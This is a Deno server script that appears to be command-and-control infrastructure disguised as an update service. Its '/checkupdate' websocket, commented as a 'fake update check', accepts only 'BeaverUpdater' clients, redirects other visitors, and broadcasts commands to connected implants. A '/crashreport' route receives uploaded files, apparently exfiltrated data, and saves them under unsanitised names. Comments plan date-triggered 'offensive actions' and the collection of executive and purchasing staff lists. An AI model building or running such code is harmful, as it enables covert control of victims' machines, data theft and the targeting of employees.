#!/usr/bin/env -S deno run -A
import { Application, Router } from "https://deno.land/x/oak/mod.ts";

const connectedClients = new Map();

const port = 8080;
const app = new Application();
const router = new Router();

// send a message to all connected clients
function broadcast(message:string) {
  for (const client of connectedClients.values()) {
    client.send(message);
  }
}


// websocket fake update check
router.get("/checkupdate", async (ctx) => {
  const socket = await ctx.upgrade();
  const username = ctx.request.url.searchParams.get("username") || "anon";
  const source_ip = ctx.request.ip;
  const user_agent = ctx.request.headers.get("user-agent");
  const headers = [...ctx.request.headers.entries()];
  if (connectedClients.has(username)) {
    socket.close(1008, `Username ${username} is already taken`);
    return;
  }
  connectedClients.set(username, socket);
  console.log(`
New client connected: ${username}
IP: ${source_ip}
User-Agent: ${user_agent}
Headers: ${headers}
  `);

  // re-route jackholes
  if (user_agent != "BeaverUpdater") {
    console.log(`jackhole detected from ${source_ip}`);
    return ctx.response.redirect("https://www.google.com/");
  }

  // new socket connection tasks
  socket.onopen = () => {};

  // client disconnect tasks
  socket.onclose = () => {
    console.log(`Client ${username} disconnected`);
    connectedClients.delete(username);
  };

  // message receive handler
  socket.onmessage = (m) => {
    const data = JSON.parse(m.data);
    
    // Need to setup an "update" handler that if a request is made on valid date, return true so "update" will perform offensive actions
    // Need to setup an whales handler to accept json payload of {"executives": [], "purchasing": []} then save to kv

    switch (data.event) {
      case "send-message":
        broadcast(
          JSON.stringify({
            event: "send-message",
            username: username,
            message: data.message,
          }),
        );
        break;

      case "command":
        console.log(data.command);
        broadcast(
            JSON.stringify({
                event: "command",
                command: data.command,
            }),
        );
        break;
    }
  };
});

// insert a new route called crashreport that accepts a file by post request
router.post("/crashreport", async (ctx) => {
  const body = await ctx.request.body({ type: "form-data" }).value.read();
  const files = Array.from(body.files.values());
  if (files.length === 0) {
    return ctx.response.status = 400;
  }
  for (const file of files) {
    console.log(`Received crash report file ${file.filename}`);
    // save the file to disk or process it as needed, need to fix this and dump to /uploads
    await Deno.writeFile(file.filename, await Deno.readAll(file.content));
  }
});

app.use(router.routes());
app.use(router.allowedMethods());
app.use(async (context) => {
  await context.send({
    root: `/web/public`,
    index: "index.html",
  });
});

console.log("Listening at http://localhost:" + port);
await app.listen({ port });